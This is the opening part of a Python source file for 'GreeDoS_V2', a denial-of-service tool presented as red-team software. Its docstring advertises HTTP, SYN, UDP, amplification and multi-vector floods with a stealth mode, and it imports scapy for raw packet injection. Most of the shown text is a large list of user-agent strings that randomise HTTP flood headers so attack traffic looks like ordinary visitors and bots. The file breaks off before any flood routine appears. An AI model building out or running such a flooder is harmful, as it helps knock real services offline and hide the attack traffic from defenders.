
# Copyright 2025_MrEchoFi_EbwerBrothers
"""MIT License

Copyright (c) 2025 MrEchoFi_EbwerBrothers_Md. Abu Naser Nayeem [Tanjib Isham]

Contributor: Emon Hasan AL-Bosry as 369emon

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE."""

"""
GreeDoS_V2 - Advanced Cybersecurity Red Team Tool
Key Features:
  - HTTP Flood (Realistic HTTP GET)
  - SYN Flood (Protocol Attack)
  - UDP Flood (Volumetric Attack)
  - Amplification Attack (Simulated)
  - Multi-Vector Attack (All types concurrently)
  - High-Speed Packet Replay using Tcpreplay
  - AI-Driven Dynamic Traffic Patterns
  - Stealth Mode for discrete operations
  - Multiprocessing for better performance
"""

import multiprocessing
import threading
import time
import random
import sys
import requests
import socket
from datetime import datetime
import subprocess
from subprocess import run

from rich.console import Console
from rich.panel import Panel

# for raw packet injection. i have import scapy / if u use another powerful library then you can change this
try:
    from scapy.all import IP, TCP, UDP, send
except ImportError:
    print("Error: Scapy is not installed. Please install it using: pip install scapy")
    sys.exit(1)


console = Console()


GreeDoS_LOGO = r"""
                                                                             
       
  __________________              ________          _________
 /  _____/\______   \ ____   ____ \______ \   ____ /   _____/
/   \  ___ |       _// __ \_/ __ \ |    |  \ /  _ \\_____  \ 
\    \_\  \|    |   \  ___/\  ___/ |    `   (  <_> )        \
 \______  /|____|_  /\___  >\___  >_______  /\____/_______  /
        \/        \/     \/     \/        \/              \/ 
 
                                                                             
"""

# http headers for HTTP Get flood
def random_http_headers():
    """Generate> HTTP headers."""
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
  "Mozilla/5.0 (Linux; Android 4.4.4; Nexus 5 Build/KTU84Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I9305T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
 "Mozilla/5.0 (Linux; U; Android 4.2.2; my-mm; GT-M6a Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
 "Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00F Build/KVT49L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.141 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; I9192 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
 "Mozilla/5.0 (Linux; Android 4.2.2; GT-P5100 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36",
 "Mozilla/5.0 (Linux; Android 4.3; SM-G7102 Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.136 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; Android 4.2.2; Galaxy S4 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; Android 4.4.2; en-us; SM-N900A Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; Android 4.4.4; XT1097 Build/KXE21.187-45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.117 Mobile",
 "Mozilla/5.0 (Linux; Android 4.4.4; XT1097 Build/KXE21.187-30.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile",
 "Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Lenovo A369i Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
 "Mozilla/5.0 (Linux; Android 4.3; D2305 Build/18.0.A.1.30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; U; Android 4.4.2; en-gb; LG-D802 Build/KOT49I.D80220c) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; U; Android 4.2.2; vi-vn; mobiistar touch BEAN 402c Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
 "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; XT1080 Build/SU4.21) AppleWebKit/537.16 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.16",
 "Mozilla/5.0 (Linux; U; Android 4.3; en-ca; HUAWEI G6-L11 Build/HuaweiG6-L11) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
 "Mozilla/5.0 (Linux; Android 4.1.2; LG-F160L Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; SonyC1505 Build/11.3.A.2.23) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
 "Mozilla/5.0 (Linux; U; Android 4.2.2; th-th; HUAWEI Y511-U30 Build/HUAWEIY511-U30) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
 "Mozilla/5.0 (Series40; Nokia2700c/09.98; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27",
 "Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2194.2 Safari/537.36",
 "Mozilla/5.0 (X11; Linux i686; rv:6.0.2) (Q7sip7ZS4Ba8FkDSOvRNleYM4KEG59V8+uT/RC1tW0U=) Gecko/20100101 Firefox/6.0.2",
 "Mozilla/5.0 (Windows NT 6.2; ARM; Trident/7.0; Touch; rv:11.0; WPDesktop; NOKIA; Lumia 925; ANZ892) like Gecko",
 "Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 925; ANZ892) like Gecko",
 "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.1; WOW64; ; CJPMS_AAPCA4157828C9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.14 Safari/537.17",
 "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2194.2 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0 FirePHP/0.7.4",
 "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30",
 "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
 "Mozilla/5.0 (iPad; CPU OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/38.0.2125.59 Mobile/12A365 Safari/600.1.4",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.99 Safari/537.22",
 "Mozilla/5.0 (iPod touch; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4",
 "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.7 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36 OPR/25.0.1614.50",
 "Mozilla/5.0 (X11; CrOS x86_64 6158.64.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.108 Safari/537.36",
 "Guzzle/4.2.3 curl/7.35.0 PHP/5.5.9-1ubuntu4.4",
 "curl/7.30.0",
 "Mozilla/5.0 (Linux ia32) node.js/0.10.32 v8/3.14.5.9",
 "Mozilla/5.0 (compatible; Googlebot/4.1; en-US rv:9.3.7) Firefox/32.5",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7)",
 "AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3",
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us)",
 "AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1)",
 "Gecko/20100101 Firefox/5.0.1",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) ",
 "AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30",
 "Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en)",
 "Presto/2.9.168 Version/11.50",
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)",
 "Baiduspider+(+http://www.baidu.com/search/spider.htm)",
 "Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
 "Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
 "Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0;  http://www.beslist.nl/)",
 "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
 "zspider/0.9-dev http://feedback.redkolibri.com/",
 "Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )",
 "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)",
 "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)",
 "Mozilla/2.0 (compatible; Ask Jeeves/Teoma)",
 "TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)",
 "TheSuBot/0.2 (www.thesubot.de)",
 "FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
 "Mozilla/4.0 (compatible: FDSE robot)",
 "findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
 "findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
 "findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
 "findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
 "findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",
 "Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable)",
 "Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable)",
 "Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2)",
 "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2)",
 "magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
 "Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",
 "Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",
 "MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)",
 "MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)",
 "Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)",
 "MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)",
 "Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0)",
 "Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)",
 "msnbot/1.0 (+http://search.msn.com/msnbot.htm)",
 "msnbot/0.9 (+http://search.msn.com/msnbot.htm)",
 "msnbot/0.11 ( http://search.msn.com/msnbot.htm)",
 "MSNBOT/0.1 (http://search.msn.com/msnbot.htm)",
 "Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)",
 "NetResearchServer/4.0(loopimprovements.com/robot.html)",
 "Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)",
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)",
 "Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET) ",
 "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
 "Opera/9.20 (Windows NT 6.0; U; en)",
 "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
 "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)",
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16)",
 "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", 
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13)",
 "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
 "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
 "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0)",
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
 "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
 "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
 "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
 "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6",
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201Firefox/2.0.0.12"
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7) "
"AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) "
"AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1) "
"Gecko/20100101 Firefox/5.0.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) "
"AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30",
"Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en) "
"Presto/2.9.168 Version/11.50",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)"
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
"Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)",
"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.7.4 (Fedora015; U; AMD_PhenX6 Linux Kernel 2.6.35.2; en-UK) DevKit/534.7 (Gecko) Chrome/7.0.517.44 GoogleR/9.47.1[BlackPanda]",
]
    
    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "*/*",
        "Connection": "keep-alive"
    }
    return headers


"""def random_https_headers():
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "https://www.pinterest.com/search/?q=",
        "https://www.pinterest.com/search/pins/?q=",
        "https://www.pinterest.com/search/pins/?q=",
        "https://www.pinterest.com/search/pins/?q=",
        "https://play.google.com/store/search?q=",
